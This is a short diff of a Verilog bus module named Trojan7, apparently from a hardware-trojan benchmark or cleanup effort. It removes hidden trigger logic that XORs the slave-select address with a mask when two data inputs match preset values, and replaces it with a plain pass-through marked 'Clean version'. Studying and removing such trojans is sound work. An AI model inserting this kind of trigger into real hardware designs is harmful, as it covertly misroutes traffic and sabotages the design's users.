@@ -13,12 +13,7 @@ module Trojan7 #(
 );
 
     always @(wb_addr_i or wb_data_i or s0_data_i) begin
-        if ((wb_data_i == WB_DATA_TRIGGER) && 
-            (s0_data_i == S0_DATA_TRIGGER)) begin
-            slv_sel = wb_addr_i[31:28] ^ XOR_MASK;
-        end else begin
-            slv_sel = wb_addr_i[31:28];
-        end
+        slv_sel = wb_addr_i[31:28]; // Clean version - always pass through without XOR
     end
 
 endmodule
